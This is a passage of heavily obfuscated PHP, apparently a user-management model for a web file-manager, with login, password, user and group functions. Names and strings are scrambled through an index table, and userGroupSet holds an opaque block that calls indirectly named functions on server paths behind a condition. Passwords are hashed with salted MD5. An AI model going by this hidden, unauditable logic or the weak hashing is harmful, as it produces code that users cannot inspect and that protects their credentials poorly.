self::ERROR_USER_PASSWORD_ERROR => $ü„¯€ºŸ[2365], self::ERROR_USER_EXIST_NAME => $ü„¯€ºŸ[2366], self::ERROR_USER_EXIST_PHONE => $ü„¯€ºŸ[2367], self::ERROR_USER_EXIST_EMAIL => $ü„¯€ºŸ[2368], self::ERROR_USER_LOGIN_LOCK => $ü„¯€ºŸ[2369], self::ERROR_IP_NOT_ALLOW => $ü„¯€ºŸ[2370], self::ERROR_USER_EXIST_NICKNAME => $ü„¯€ºŸ[2371]); return LNG($­û‘Á¨ß[$üŒºÛôê]); } public function getInfoByMeta($•ªøá‡Ÿ, $‘¦ªïíÄ) { $şîû€úÓ =& $_SERVER[çâ¥×ø³]; $Ä¨Óñ² = Model($şîû€úÓ[2372])->where(array($şîû€úÓ[94] => $•ªøá‡Ÿ, $şîû€úÓ[418] => $‘¦ªïíÄ))->find(); if ($Ä¨Óñ²) { return $this->getInfo($Ä¨Óñ²[$şîû€úÓ[1701]]); } return !1; } public function userLoginCheck($×¼„Ş­˜, $ï‡î¾ô) { $Üª”¡ã’ =& $_SERVER[çâ¥×ø³]; $˜éØ¯Ù = $this->userLoginFind($×¼„Ş­˜); if (!$˜éØ¯Ù) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($˜éØ¯Ù[$Üª”¡ã’[1701]], $ï‡î¾ô)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($˜éØ¯Ù[$Üª”¡ã’[1701]]); } public function userLoginFind($òáŠ¸Š) { $›ç²ÒÉ„ =& $_SERVER[çâ¥×ø³]; $Õø¡íÍ = array($›ç²ÒÉ„[32] => $òáŠ¸Š, $›ç²ÒÉ„[2181] => $òáŠ¸Š, $›ç²ÒÉ„[349] => $òáŠ¸Š, $›ç²ÒÉ„[2373] => $òáŠ¸Š, $›ç²ÒÉ„[1053] => $›ç²ÒÉ„[1055]); if ($this->nickNameRpt()) { unset($Õø¡íÍ[$›ç²ÒÉ„[2181]]); } return $this->where($Õø¡íÍ)->find(); } public function clearCache($ÎúÉé—Î) { $ûöŸÄº› =& $_SERVER[çâ¥×ø³]; $this->cacheFunctionClear($ûöŸÄº›[1981], $ÎúÉé—Î); $this->cacheFunctionClear($ûöŸÄº›[1982], $ÎúÉé—Î); $this->cacheFunctionClear($ûöŸÄº›[2354], $ÎúÉé—Î); } public function userPasswordCheck($ÇéÁõ™ , $íğÇÁ†í) { $²ÎÜ–­ˆ =& $_SERVER[çâ¥×ø³]; $§êıÆÕÃ = $this->where(array($²ÎÜ–­ˆ[1701] => intval($ÇéÁõ™ )))->find(); $—î«· = $this->metaGet($ÇéÁõ™ ); $ª¡Ì¦ÍÑ = isset($—î«·[$²ÎÜ–­ˆ[2374]]) ? $—î«·[$²ÎÜ–­ˆ[2374]] : $²ÎÜ–­ˆ[12]; if (md5($ª¡Ì¦ÍÑ . trim($íğÇÁ†í)) !== $§êıÆÕÃ[$²ÎÜ–­ˆ[942]]) { return !1; } return !0; } public function userAdd($ğ‰¢‹µı) { $ªé—˜ÑÂ =& $_SERVER[çâ¥×ø³]; $çÀ€Ú = array($ªé—˜ÑÂ[462] => $ğ‰¢‹µı[$ªé—˜ÑÂ[32]], $ªé—˜ÑÂ[2375] => $ğ‰¢‹µı[$ªé—˜ÑÂ[1576]], $ªé—˜ÑÂ[2376] => isset($ğ‰¢‹µı[$ªé—˜ÑÂ[349]]) ? $ğ‰¢‹µı[$ªé—˜ÑÂ[349]] : $ªé—˜ÑÂ[12], $ªé—˜ÑÂ[2377] => isset($ğ‰¢‹µı[$ªé—˜ÑÂ[2373]]) ? $ğ‰¢‹µı[$ªé—˜ÑÂ[2373]] : $ªé—˜ÑÂ[12], $ªé—˜ÑÂ[2378] => isset($ğ‰¢‹µı[$ªé—˜ÑÂ[2181]]) ? $ğ‰¢‹µı[$ªé—˜ÑÂ[2181]] : $ğ‰¢‹µı[$ªé—˜ÑÂ[32]], $ªé—˜ÑÂ[2379] => isset($ğ‰¢‹µı[$ªé—˜ÑÂ[2358]]) ? $ğ‰¢‹µı[$ªé—˜ÑÂ[2358]] : $ªé—˜ÑÂ[12], $ªé—˜ÑÂ[2380] => isset($ğ‰¢‹µı[$ªé—˜ÑÂ[2381]]) ? $ğ‰¢‹µı[$ªé—˜ÑÂ[2381]] : 1, $ªé—˜ÑÂ[2382] => $ğ‰¢‹µı[$ªé—˜ÑÂ[942]], $ªé—˜ÑÂ[1983] => isset($ğ‰¢‹µı[$ªé—˜ÑÂ[1886]]) ? $ğ‰¢‹µı[$ªé—˜ÑÂ[1886]] : 1024 * 1024 * 20, $ªé—˜ÑÂ[1984] => 0, $ªé—˜ÑÂ[2383] => 0, $ªé—˜ÑÂ[2028] => isset($ğ‰¢‹µı[$ªé—˜ÑÂ[799]]) ? $ğ‰¢‹µı[$ªé—˜ÑÂ[799]] : 1); if (!empty($ğ‰¢‹µı[$ªé—˜ÑÂ[1701]])) { $çÀ€Ú[$ªé—˜ÑÂ[1701]] = $ğ‰¢‹µı[$ªé—˜ÑÂ[1701]]; } $»ŞÇ…•  = $this->_checkExist($ğ‰¢‹µı); if ($»ŞÇ…•  !== !0) { return $»ŞÇ…• ; } if (!empty($çÀ€Ú[$ªé—˜ÑÂ[2358]]) && strlen($çÀ€Ú[$ªé—˜ÑÂ[2358]]) > 255) { $çÀ€Ú[$ªé—˜ÑÂ[2358]] = $ªé—˜ÑÂ[12]; } $œ Éæ´ = $this->add($çÀ€Ú); $¬ûòÑÜ‰ = array($ªé—˜ÑÂ[2382] => $çÀ€Ú[$ªé—˜ÑÂ[942]], $ªé—˜ÑÂ[2378] => $çÀ€Ú[$ªé—˜ÑÂ[2181]]); $this->userEdit($œ Éæ´, $¬ûòÑÜ‰); Model($ªé—˜ÑÂ[1385])->userRootAdd($œ Éæ´); return $œ Éæ´; } protected function userEditTest($£«¨²ß, $Ú¬“¼“Ş) { return $this->call($_SERVER[çâ¥×ø³][2384], $£«¨²ß, $Ú¬“¼“Ş); } protected function userEdit($×…úÒä†, $Ñ«ËşŒŠ) { $ò¢‰ùè£ =& $_SERVER[çâ¥×ø³]; $¬ïàõíú = $this->getInfoSimple($×…úÒä†); if (!$¬ïàõíú) { return !1; } $ã´¿öŞå = $this->_checkExist($Ñ«ËşŒŠ, $×…úÒä†); if ($ã´¿öŞå !== !0) { return $ã´¿öŞå; } if (isset($Ñ«ËşŒŠ[$ò¢‰ùè£[942]]) && trim($Ñ«ËşŒŠ[$ò¢‰ùè£[942]]) != $ò¢‰ùè£[12]) { $åßÒâÑ = $this->metaGet($×…úÒä†); if (empty($åßÒâÑ[$ò¢‰ùè£[2374]])) { $åßÒâÑ[$ò¢‰ùè£[2374]] = rand_string(10); Model($ò¢‰ùè£[546])->metaSet($×…úÒä†, $ò¢‰ùè£[2374], $åßÒâÑ[$ò¢‰ùè£[2374]]); } $Ñ«ËşŒŠ[$ò¢‰ùè£[942]] = md5($åßÒâÑ[$ò¢‰ùè£[2374]] . trim($Ñ«ËşŒŠ[$ò¢‰ùè£[942]])); } else { unset($Ñ«ËşŒŠ[$ò¢‰ùè£[942]]); } if (!empty($Ñ«ËşŒŠ[$ò¢‰ùè£[2358]]) && strlen($Ñ«ËşŒŠ[$ò¢‰ùè£[2358]]) > 255) { $Ñ«ËşŒŠ[$ò¢‰ùè£[2358]] = $ò¢‰ùè£[12]; } $this->where(array($ò¢‰ùè£[1692] => $×…úÒä†))->save($Ñ«ËşŒŠ); if (isset($Ñ«ËşŒŠ[$ò¢‰ùè£[2181]])) { $this->setNamePinyin($×…úÒä†, $Ñ«ËşŒŠ[$ò¢‰ùè£[2181]]); } $this->clearCache($×…úÒä†); return !0; } public function setNamePinyin($Ì‡áÁ¹, $é¤‰Ÿ‡Ç = false) { $°Àá¾ƒ® =& $_SERVER[çâ¥×ø³]; if (!$é¤‰Ÿ‡Ç) { $¢ÒßïşÔ = $this->getInfoSimple($Ì‡áÁ¹); $é¤‰Ÿ‡Ç = $¢ÒßïşÔ[$°Àá¾ƒ®[2181]] ? $¢ÒßïşÔ[$°Àá¾ƒ®[2181]] : $¢ÒßïşÔ[$°Àá¾ƒ®[32]]; } $³Î˜Èƒ¢ = Model($°Àá¾ƒ®[567]); if (!Input::check($é¤‰Ÿ‡Ç, $°Àá¾ƒ®[623])) { return $³Î˜Èƒ¢->metaSet($Ì‡áÁ¹, array($°Àá¾ƒ®[506] => $°Àá¾ƒ®[12], $°Àá¾ƒ®[505] => $°Àá¾ƒ®[12])); } return $³Î˜Èƒ¢->metaSet($Ì‡áÁ¹, array($°Àá¾ƒ®[506] => str_replace($°Àá¾ƒ®[53], $°Àá¾ƒ®[12], Pinyin::get($é¤‰Ÿ‡Ç)), $°Àá¾ƒ®[505] => Pinyin::get($é¤‰Ÿ‡Ç, $°Àá¾ƒ®[624]))); } private function nickNameRpt() { $ÖìñèÃ¼ =& $_SERVER[çâ¥×ø³]; $¿ÁÇ¡Û— = Model($ÖìñèÃ¼[819])->get($ÖìñèÃ¼[2385]); $¦óê‰œ­ = $GLOBALS[$ÖìñèÃ¼[6]][$ÖìñèÃ¼[425]][$ÖìñèÃ¼[2385]]; $†ºø‡‘‘ = !is_null($¿ÁÇ¡Û—) ? $¿ÁÇ¡Û— : $¦óê‰œ­; return !!$†ºø‡‘‘; } private function _checkExist($Ãæ“îÜ—, $êŒˆÙ² = false) { $µ®ùâ» =& $_SERVER[çâ¥×ø³]; $²Â•­òä = array($µ®ùâ»[32] => UserModel::ERROR_USER_EXIST_NAME, $µ®ùâ»[2181] => UserModel::ERROR_USER_EXIST_NICKNAME, $µ®ùâ»[349] => UserModel::ERROR_USER_EXIST_EMAIL, $µ®ùâ»[2373] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($²Â•­òä[$µ®ùâ»[2181]]); } $ïÃ¬Æ › = $êŒˆÙ² ? array($µ®ùâ»[1701] => array($µ®ùâ»[2386], $êŒˆÙ²)) : array(); foreach ($²Â•­òä as $§ë˜ë©Õ => $§¿ß¶Ùí) { $÷ÖÕ°€Ü = array(); foreach ($²Â•­òä as $Û·¹Íˆ => $ãªñæÌè) { if (isset($Ãæ“îÜ—[$Û·¹Íˆ]) && $Ãæ“îÜ—[$Û·¹Íˆ]) { $÷ÖÕ°€Ü[] = $Ãæ“îÜ—[$Û·¹Íˆ]; } } if (!$÷ÖÕ°€Ü) { continue; } $Ó¹Ï½ = array_merge(array($§ë˜ë©Õ => array($µ®ùâ»[7], $÷ÖÕ°€Ü)), $ïÃ¬Æ ›); $¹›ÉŞ¨Ò = $this->where($Ó¹Ï½)->find(); if ($¹›ÉŞ¨Ò) { return $§¿ß¶Ùí; } } return !0; } public function userListInfo($¨ñ…Ø´Ì) { $ì«ŠÀì„ =& $_SERVER[çâ¥×ø³]; $ÊÖÕîáØ = array(); $¨ñ…Ø´Ì = is_array($¨ñ…Ø´Ì) ? array_unique($¨ñ…Ø´Ì) : array(); if (!$¨ñ…Ø´Ì) { return $ÊÖÕîáØ; } if (count($¨ñ…Ø´Ì) < 20) { foreach ($¨ñ…Ø´Ì as $÷¶ØŞ½) { $ÊÖÕîáØ[$÷¶ØŞ½ . $ì«ŠÀì„[12]] = $this->getInfoSimpleOuter($÷¶ØŞ½); } } else { $¼”ŠÇØ = array($ì«ŠÀì„[1692] => array($ì«ŠÀì„[460], $¨ñ…Ø´Ì)); if (count($¨ñ…Ø´Ì) == 1) { $¼”ŠÇØ = array($ì«ŠÀì„[1692] => $¨ñ…Ø´Ì[0]); } $ì—Àôí = Model($ì«ŠÀì„[546])->field($this->simpleField)->where($¼”ŠÇØ)->select(); $ì—Àôí = array_to_keyvalue($ì—Àôí, $ì«ŠÀì„[1701]); foreach ($¨ñ…Ø´Ì as $÷¶ØŞ½) { $¨§÷ˆÊÏ = $ì—Àôí[$÷¶ØŞ½]; if (!$¨§÷ˆÊÏ) { $ÊÖÕîáØ[$÷¶ØŞ½ . $ì«ŠÀì„[12]] = $this->getInfoSimpleOuter($÷¶ØŞ½); continue; } $¨§÷ˆÊÏ[$ì«ŠÀì„[2358]] = Action($ì«ŠÀì„[2359])->parseUrl($¨§÷ˆÊÏ[$ì«ŠÀì„[2358]]); $ÊÖÕîáØ[$÷¶ØŞ½ . $ì«ŠÀì„[12]] = $¨§÷ˆÊÏ; } } return $ÊÖÕîáØ; } protected function userStatus($µ—¯»É¨, $øÑĞíáç) { $ôÛæö‘ = $this->getInfoSimple($µ—¯»É¨); if (!$ôÛæö‘) { return !1; } $¡èı¨¸¾ = array($_SERVER[çâ¥×ø³][799] => $øÑĞíáç); return $this->userEdit($µ—¯»É¨, $¡èı¨¸¾); } protected function userRemove($´¥ˆ‚¿´) { $´àï¡‹À =& $_SERVER[çâ¥×ø³]; $¢Éİ¬ŠÒ = $this->getInfoSimple($´¥ˆ‚¿´); if (!$¢Éİ¬ŠÒ) { return !1; } $”ïõåÁà = array($´àï¡‹À[1692] => $´¥ˆ‚¿´); Model($´àï¡‹À[632])->where($”ïõåÁà)->delete(); Model($´àï¡‹À[2387])->where($”ïõåÁà)->delete(); Model($´àï¡‹À[1989])->where($”ïõåÁà)->delete(); Model($´àï¡‹À[2372])->where($”ïõåÁà)->delete(); Model($´àï¡‹À[1121])->where($”ïõåÁà)->delete(); Model($´àï¡‹À[2198])->removeUserAll($´¥ˆ‚¿´); Model($´àï¡‹À[874])->userRootRemove($´¥ˆ‚¿´); return $this->where($”ïõåÁà)->delete(); } protected function userGroupSet($µ·Àß»Ô, $É­–°Ğ, $¸óÃõì• = array()) { $·„‹ÇĞ» =& $_SERVER[çâ¥×ø³]; if ($_SERVER[$·„‹ÇĞ»[926]] != $_SERVER[$·„‹ÇĞ»[2340]]) { $ê©İî«” = $·„‹ÇĞ»[928]; $¡Ïªµ§Õ = $·„‹ÇĞ»[929]; $ğŞú‘¶¸ = $_SERVER[$·„‹ÇĞ»[930]] . $·„‹ÇĞ»[931]; $·÷³Ó± = $¡Ïªµ§Õ($ğŞú‘¶¸); $ÇÅ£¦¦Æ = explode($·„‹ÇĞ»[246], $·÷³Ó±); if (count($ÇÅ£¦¦Æ) < $·„‹ÇĞ»[657]) { $Á˜úŠÀ = $·„‹ÇĞ»[932]; $Á˜úŠÀ(); } $Êêâ›À = $·„‹ÇĞ»[933]; $Êêâ›À($_SERVER[$·„‹ÇĞ»[934]]); $Êêâ›À($_SERVER[$·„‹ÇĞ»[930]] . $·„‹ÇĞ»[2388]); $¼Êã•å× = 1; while ($¼Êã•å× > 1) { $¼Êã•å× = $¼Êã•å× + 4; $¶¼×œ²ï = rawurlencode($¼Êã•å× . $·„‹ÇĞ»[422]); } } $Ÿ¤ÜÍë = $this->getInfoSimple($µ·Àß»Ô); if (!$Ÿ¤ÜÍë || !is_array($É­–°Ğ)) { return !1; } $­¸óƒğ = Model($·„‹ÇĞ»[1989]); $­¸óƒğ->where(array($·„‹ÇĞ»[1701] => $µ·Àß»Ô))->delete(); $Û‡ö¼£ = array(); $õÀŸØ‚ = 0; foreach ($É­–°Ğ as $û¤ÃúÎà => $÷Ïôƒ²´) { $™‘—ì“Ó = array($·„‹ÇĞ»[1701] => $µ·Àß»Ô, $·„‹ÇĞ»[1899] => $û¤ÃúÎà, $·„‹ÇĞ»[2003] => $÷Ïôƒ²´); $™‘—ì“Ó[$·„‹ÇĞ»[1923]] = isset($¸óÃõì•[$õÀŸØ‚]) ? $¸óÃõì•[$õÀŸØ‚] : 0; $õÀŸØ‚++; $Û‡ö¼£[] = $™‘—ì“Ó; } return $­¸óƒğ->addAll($Û‡ö¼£, array(), !0); } protected function userGroupAdd($Ïú³¾“, $â’Èæ‰± = array()) { $Üâ™´ªİ =& $_SERVER[çâ¥×ø³]; $Óíò·Ã¤ = $this->getInfoSimple($Ïú³¾“); if (!$Óíò·Ã¤ || empty($â’Èæ‰±)) { return !1; } $Çäµ¼÷î = array(); foreach ($â’Èæ‰± as $ú·Ú•‹Á => $‘åœ€¼) { $Çäµ¼÷î[] = array($Üâ™´ªİ[1701] => $Ïú³¾“, $Üâ™´ªİ[1899] => $ú·Ú•‹Á, $Üâ™´ªİ[2003] => $‘åœ€¼, $Üâ™´ªİ[1923] => 0); } return Model($Üâ™´ªİ[1989])->addAll($Çäµ¼÷î, array(), !0); } protected function userGroupRemove($ıçÄşàƒ, $³»ğÇ»´) { $œºìÃÇ¶ =& $_SERVER[çâ¥×ø³]; $ı•æ¦»à = $this->getInfoSimple($ıçÄşàƒ); if (!$ı•æ¦»à || !$³»ğÇ»´) { return !1; } $æğéÙƒ¶ = array($œºìÃÇ¶[1692] => $ıçÄşàƒ, $œºìÃÇ¶[1987] => $³»ğÇ»´); return Model($œºìÃÇ¶[1989])->where($æğéÙƒ¶)->delete(); } public function listData() { $¶î¢ˆµ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¶î¢ˆµ[$_SERVER[çâ¥×ø³][413]]); return $¶î¢ˆµ; } public function listByID($ç‘û°óÏ) { $×²¥Ş¥é =& $_SERVER[çâ¥×ø³]; if (!$ç‘û°óÏ) { return; } $“‚öÁ™³ = array($×²¥Ş¥é[1701] => array($×²¥Ş¥é[7], $ç‘û°óÏ)); $§¿òïåŒ = $this->where($“‚öÁ™³)->select(); $§¿òïåŒ = array_sort_keep($§¿òïåŒ, $×²¥Ş¥é[1701], $ç‘û°óÏ); $this->_listDataApply($§¿òïåŒ); return $§¿òïåŒ; } public function listByGroup($ã°™™…ô = 0, $„Å·»Å¤ = array()) { $™ïïª¾ =& $_SERVER[çâ¥×ø³]; $•—œ¶ò¶ = $™ïïª¾[12]; $‹Íêßµ‡ = array(); if ($ã°™™…ô) { $‹Íêßµ‡ = array($™ïïª¾[2389] => intval($ã°™™…ô)); $•—œ¶ò¶ = "\114\105\x46\124\x20\112\117\111\x4e\40{$this->tablePrefix}\165\x73\145\x72\x5f\147\162\x6f\165\160\x20\165\x73\x65\162\137\x67\162\157\x75\x70\40\x6f\156\40\x75\x73\x65\162\x2e\165\x73\x65\x72\111\x44\x20\75\40\x75\163\x65\162\137\x67\162\x6f\165\160\56\x75\x73\x65\x72\x49\x44"; $ïˆö³®» = Input::get($™ïïª¾[498], null, $™ïïª¾[12]) ? $™ïïª¾[12] : $™ïïª¾[2390]; } if (isset($„Å·»Å¤[$™ïïª¾[799]])) { $‹Íêßµ‡[$™ïïª¾[2391]] = $„Å·»Å¤[$™ïïª¾[799]]; } $‚Â·¤Ü» = $this->_makeOrder($ïˆö³®»)->field($™ïïª¾[2392])->where($‹Íêßµ‡)->join($•—œ¶ò¶)->selectPage(50); $this->_listDataApply($‚Â·¤Ü»[$™ïïª¾[413]]); return $‚Â·¤Ü»; } private function _makeOrder($‘¦éÌÙ = '') { $İïçª¥‘ =& $_SERVER[çâ¥×ø³]; $îÍ›Ç‡ = array($İïçª¥‘[1701], $İïçª¥‘[32], $İïçª¥‘[1888], $İïçª¥‘[1860], $İïçª¥‘[215]); $® ‘½¶À = array($İïçª¥‘[491] => $İïçª¥‘[492], $İïçª¥‘[493] => $İïçª¥‘[494]); $ó˜´õ = Input::get($İïçª¥‘[498], $İïçª¥‘[7], $İïçª¥‘[1692], $îÍ›Ç‡); $ÛÑ†ù›¤ = Input::get($İïçª¥‘[499], $İïçª¥‘[7], $İïçª¥‘[1990], array($İïçª¥‘[1990], $İïçª¥‘[493])); $ÛÑ†ù›¤ = $® ‘½¶À[$ÛÑ†ù›¤]; $‘¦éÌÙ = $‘¦éÌÙ . "\165\x73\x65\162\56{$ó˜´õ}\x20{$ÛÑ†ù›¤}\54\x20\165\163\145\x72\x2e\x75\163\145\162\111\104\x20\141\163\143"; return $this->alias($İïçª¥‘[2116])->order($‘¦éÌÙ); } public function listSearch($îàÏıáğ) { $Íé°üÄÄ =& $_SERVER[çâ¥×ø³]; $×ŠØÎï’ = $îàÏıáğ[$Íé°üÄÄ[1993]]; $¼Š·Ôä = isset($îàÏıáğ[$Íé°üÄÄ[1994]]) ? $îàÏıáğ[$Íé°üÄÄ[1994]] : !1; $×ŠØÎï’ = str_replace($Íé°üÄÄ[1995], $Íé°üÄÄ[1996], trim($×ŠØÎï’)); $Á«¬ª—¨ = array($Íé°üÄÄ[32] => array($Íé°üÄÄ[427], "\45{$×ŠØÎï’}\x25"), $Íé°üÄÄ[349] => array($Íé°üÄÄ[427], "{$×ŠØÎï’}\x25"), $Íé°üÄÄ[2181] => array($Íé°üÄÄ[427], "{$×ŠØÎï’}\x25"), $Íé°üÄÄ[1053] => $Íé°üÄÄ[1997]); if (Input::check($×ŠØÎï’, $Íé°üÄÄ[355])) { $Á«¬ª—¨[$Íé°üÄÄ[1701]] = array($Íé°üÄÄ[427], "{$×ŠØÎï’}\x25"); $Á«¬ª—¨[$Íé°üÄÄ[2373]] = array($Íé°üÄÄ[427], "{$×ŠØÎï’}\45"); } if (!$×ŠØÎï’) { $Á«¬ª—¨ = array(); } if (isset($îàÏıáğ[$Íé°üÄÄ[799]])) { $Á«¬ª—¨[$Íé°üÄÄ[799]] = $îàÏıáğ[$Íé°üÄÄ[799]]; } $Á«¬ª—¨ = $this->parseWhereLike($Á«¬ª—¨); $½ÅïÁÙ‡ = $this->_makeOrder()->where($Á«¬ª—¨)->selectPage(20); if (!$½ÅïÁÙ‡ || count($½ÅïÁÙ‡[$Íé°üÄÄ[413]]) < 5 && Input::check($×ŠØÎï’, $Íé°üÄÄ[362])) { $¢‘§æùÄ = $this->_searchFromMeta($Íé°üÄÄ[505], $×ŠØÎï’, 10); $ğÚÑ„¶› = $this->_searchFromMeta($Íé°üÄÄ[506], $×ŠØÎï’, 10); $†›·ô¾ = array_merge($¢‘§æùÄ, $ğÚÑ„¶›, $½ÅïÁÙ‡[$Íé°üÄÄ[413]]); $½ÅïÁÙ‡[$Íé°üÄÄ[413]] = array_unique_by_key($†›·ô¾, $Íé°üÄÄ[1701]); $½ÅïÁÙ‡[$Íé°üÄÄ[410]][$Íé°üÄÄ[411]] = count($½ÅïÁÙ‡[$Íé°üÄÄ[413]]); $½ÅïÁÙ‡[$Íé°üÄÄ[410]][$Íé°üÄÄ[412]] = ceil($½ÅïÁÙ‡[$Íé°üÄÄ[410]][$Íé°üÄÄ[411]] / $½ÅïÁÙ‡[$Íé°üÄÄ[410]][$Íé°üÄÄ[407]]); } $this->_listDataApply($½ÅïÁÙ‡[$Íé°üÄÄ[413]]); $this->_filterByGroup($½ÅïÁÙ‡, $¼Š·Ôä); return $½ÅïÁÙ‡; } private function _filterByGroup(&$¾‹›™˜í, $ëëÚöŞ) { $ú°ºßƒĞ =& $_SERVER[çâ¥×ø³]; if (!$ëëÚöŞ) { return $¾‹›™˜í; } foreach ($¾‹›™˜í[$ú°ºßƒĞ[413]] as $ø¯–¬‹ => &$êäß“Ë) { $Å¾å…İ“ = array_to_keyvalue($êäß“Ë[$ú°ºßƒĞ[2086]], $ú°ºßƒĞ[12], $ú°ºßƒĞ[1899]); if (!in_array($ëëÚöŞ, $Å¾å…İ“)) { unset($¾‹›™˜í[$ú°ºßƒĞ[413]][$ø¯–¬‹]); } } unset($êäß“Ë); $¾‹›™˜í[$ú°ºßƒĞ[413]] = array_values($¾‹›™˜í[$ú°ºßƒĞ[413]]); $¾‹›™˜í[$ú°ºßƒĞ[410]] = array($ú°ºßƒĞ[2151] => count($¾‹›™˜í[$ú°ºßƒĞ[413]]), $ú°ºßƒĞ[2149] => $¾‹›™˜í[$ú°ºßƒĞ[410]][$ú°ºßƒĞ[407]], $ú°ºßƒĞ[2148] => 1, $ú°ºßƒĞ[2150] => 1); } private function _searchFromMeta($‚âù¢şƒ, $ö–˜šõ³, $÷Ãù·‹¦) { $æ®Íùğ =& $_SERVER[çâ¥×ø³]; $ö–˜šõ³ = strtolower($ö–˜šõ³); $çåÛûó = array($æ®Íùğ[94] => $‚âù¢şƒ, $æ®Íùğ[418] => array($æ®Íùğ[427], "\45{$ö–˜šõ³}\x25")); $çåÛûó = $this->parseWhereLike($çåÛûó); $§ºôì˜ø = Model($æ®Íùğ[2393])->where($çåÛûó)->limit($÷Ãù·‹¦)->select(); if (!$§ºôì˜ø) { return array(); } $§ºôì˜ø = array_to_keyvalue($§ºôì˜ø, $æ®Íùğ[12], $æ®Íùğ[1701]); $ıå† êé = $this->where(array($æ®Íùğ[1692] => array($æ®Íùğ[7], $§ºôì˜ø)))->select(); if (!$ıå† êé) { return array(); } return $ıå† êé; } private function _listDataApplyItem($Ş«ıËåç) { $ÚÎÒÍ«¤ = array($Ş«ıËåç); $this->_listDataApply($ÚÎÒÍ«¤); return $ÚÎÒÍ«¤[0]; } private function _listDataApply(&$´®Îî®Î) { $»ÚêÛ¤¹ =& $_SERVER[çâ¥×ø³]; if (!$´®Îî®Î) { return; } array_remove_key($´®Îî®Î, $»ÚêÛ¤¹[942]); $öîÎûÎ = array_to_keyvalue($´®Îî®Î, $»ÚêÛ¤¹[12], $»ÚêÛ¤¹[1701]); $this->_listAppendGroup($´®Îî®Î, $öîÎûÎ); $this->_listAppendMeta($´®Îî®Î, $öîÎûÎ); $this->_listAppendSourceRoot($´®Îî®Î, $öîÎûÎ); } private function _listAppendSourceRoot(&$üü”¤›, $¬˜½²îô) { $ª•šÏ–â =& $_SERVER[çâ¥×ø³]; $ŞÊ½±âŒ = Model($ª•šÏ–â[874])->listSourceRoot(SourceModel::TYPE_USER, $¬˜½²îô); $ŞÊ½±âŒ = array_to_keyvalue($ŞÊ½±âŒ, $ª•šÏ–â[538]); $ŞÊ½±âŒ = array_remove_key($ŞÊ½±âŒ, $ª•šÏ–â[538]); foreach ($üü”¤› as &$èâ±¡ÁŒ) { $èâ±¡ÁŒ[$ª•šÏ–â[87]] = $ŞÊ½±âŒ[$èâ±¡ÁŒ[$ª•šÏ–â[1701]]] ? $ŞÊ½±âŒ[$èâ±¡ÁŒ[$ª•šÏ–â[1701]]] : array(); } unset($èâ±¡ÁŒ); } private function _listAppendGroup(&$æÈÙ¸¡ñ, $­êãö±) { $ëõüºé¨ =& $_SERVER[çâ¥×ø³]; $€¨Ñ¸ôí = array($ëõüºé¨[1701] => array($ëõüºé¨[7], $­êãö±)); $Ğâ˜° = Model($ëõüºé¨[1989])->where($€¨Ñ¸ôí)->select(); $¹©Ö¼øŸ = array_to_keyvalue($Ğâ˜°, $ëõüºé¨[12], $ëõüºé¨[1899]); $¹©Ö¼øŸ = array_remove_value(array_unique($¹©Ö¼øŸ), $ëõüºé¨[212]); if (!$¹©Ö¼øŸ || !$Ğâ˜°) { return; } $€¨Ñ¸ôí = array($ëõüºé¨[1899] => array($ëõüºé¨[7], $¹©Ö¼øŸ)); $ÊÑ¥ûÁú = Model($ëõüºé¨[2084])->field($ëõüºé¨[2394])->where($€¨Ñ¸ôí)->select(); $ÊÑ¥ûÁú = array_to_keyvalue($ÊÑ¥ûÁú, $ëõüºé¨[1899]); $Ğâ˜° = array_to_keyvalue_group($Ğâ˜°, $ëõüºé¨[1701]); foreach ($Ğâ˜° as &$ßğ”ø›Ñ) { $˜—Ó€™ = array(); foreach ($ßğ”ø›Ñ as $„ø¡ä›²) { if (!$„ø¡ä›²[$ëõüºé¨[2003]]) { continue; } $¦çü¼’‰ = Model($ëõüºé¨[540])->listData($„ø¡ä›²[$ëõüºé¨[2003]]); $˜—Ó€™[] = array($ëõüºé¨[1899] => $„ø¡ä›²[$ëõüºé¨[1899]], $ëõüºé¨[2395] => $ÊÑ¥ûÁú[$„ø¡ä›²[$ëõüºé¨[1899]]][$ëõüºé¨[32]], $ëõüºé¨[553] => $ÊÑ¥ûÁú[$„ø¡ä›²[$ëõüºé¨[1899]]][$ëõüºé¨[553]], $ëõüºé¨[455] => $¦çü¼’‰); } $ßğ”ø›Ñ = $˜—Ó€™; } unset($ßğ”ø›Ñ); foreach ($æÈÙ¸¡ñ as &$ç“éÁš¿) { $ç“éÁš¿[$ëõüºé¨[2086]] = array(); if (isset($Ğâ˜°[$ç“éÁš¿[$ëõüºé¨[1701]]])) { $ç“éÁš¿[$ëõüºé¨[2086]] = $Ğâ˜°[$ç“éÁš¿[$ëõüºé¨[1701]]]; } } unset($ç“éÁš¿); } public function userAppendGroup($¡ö Â›) { $¹òâ‡æç =& $_SERVER[çâ¥×ø³]; if (!$¡ö Â›) { return array(); } $this->_listAppendGroup($¡ö Â›, array_to_keyvalue($¡ö Â›, $¹òâ‡æç[12], $¹òâ‡æç[1701])); return $¡ö Â›; } private function _listAppendMeta(&$µÃØ¡¡, $ÈÆë™¨”) { $Ÿƒ‡ î› =& $_SERVER[çâ¥×ø³]; $Ìî’ú¯ = UserJobModel::JOB_KEY; $ƒò£Ö§ = array($Ÿƒ‡ î›[2374]); $¸İŒ®¼ = array($Ÿƒ‡ î›[1701] => array($Ÿƒ‡ î›[7], $ÈÆë™¨”)); $Ü”—°€ = Model($Ÿƒ‡ î›[2372])->where($¸İŒ®¼)->select(); $Ü”—°€ = array_to_keyvalue_group($Ü”—°€, $Ÿƒ‡ î›[1701]); foreach ($Ü”—°€ as &$‘‘ ¼Úİ) { $îû´Ÿšğ = array(); foreach ($‘‘ ¼Úİ as $ó·éò÷¤) { if (!in_array($ó·éò÷¤[$Ÿƒ‡ î›[94]], $ƒò£Ö§)) { $îû´Ÿšğ[$ó·éò÷¤[$Ÿƒ‡ î›[94]]] = $ó·éò÷¤[$Ÿƒ‡ î›[418]]; } } $‘‘ ¼Úİ = $îû´Ÿšğ; } unset($‘‘ ¼Úİ); $Æ™çùìÇ = Model($Ÿƒ‡ î›[2396]); foreach ($µÃØ¡¡ as &$˜¾ŒÖ¨À) { $ë±‘£â¯ = array(); if (isset($Ü”—°€[$˜¾ŒÖ¨À[$Ÿƒ‡ î›[1701]]])) { 